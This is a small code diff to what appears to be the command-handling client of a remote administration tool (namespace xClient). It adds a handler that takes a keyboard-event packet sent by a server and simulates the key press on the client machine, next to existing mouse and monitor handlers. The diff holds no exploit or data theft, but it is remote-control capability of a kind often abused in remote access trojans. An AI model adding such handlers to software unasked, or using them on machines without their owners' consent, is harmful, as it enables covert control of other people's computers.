@@ -96,7 +96,12 @@ namespace xClient.Core.Commands
                 case MouseAction.ScrollUp:
                     NativeMethodsHelper.DoMouseEventScroll(p, false);
                     break;
-            }       
+            }
+        }
+
+        public static void HandleDoKeyboardEvent(Packets.ServerPackets.DoKeyboardEvent command, Client client)
+        {
+            NativeMethodsHelper.DoKeyPress(command.Key);
         }
 
         public static void HandleGetMonitors(Packets.ServerPackets.GetMonitors command, Client client)
